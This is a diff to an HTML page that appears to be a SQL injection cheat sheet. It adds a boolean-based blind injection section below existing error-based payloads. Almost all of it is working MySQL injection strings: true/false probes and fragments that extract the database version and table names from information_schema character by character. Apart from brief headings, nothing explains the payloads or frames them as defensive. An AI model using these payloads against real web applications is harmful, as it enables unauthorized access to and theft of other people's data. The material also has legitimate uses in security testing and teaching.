@@ -67,3 +67,25 @@ AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)
 
 <b>Table</b><br>
 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x<br> FROM information_schema.tables GROUP BY x) y)<br>
+
+<h2>Boolean Based Blind</h2>
+<b>Intro</b><br>
+select substr('abcde',1,1);<br>
+select ascii('a');<br>
+select ascii(substr(@@version,1,1));<br>
+
+<b>True or False</b><br>
+select ascii(substr(@@version,1,1)) < 50;<br>
+select ascii(substr(@@version,1,1)) < 40;<br>
+select ascii(substr(@@version,1,1)) = 49;<br>
+
+<b>Testing</b><br>
+1 and 1=1 -> True<br>
+1 and 1=2 -> False<br>
+
+<b>Version</b><br>
+and ascii(substr(@@version,1,1)) = 49 -> First Character<br>
+and ascii(substring(version(),2,1)) = 48 -> Second Character<br>
+
+<b>Table</b><br>
+and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100<br>
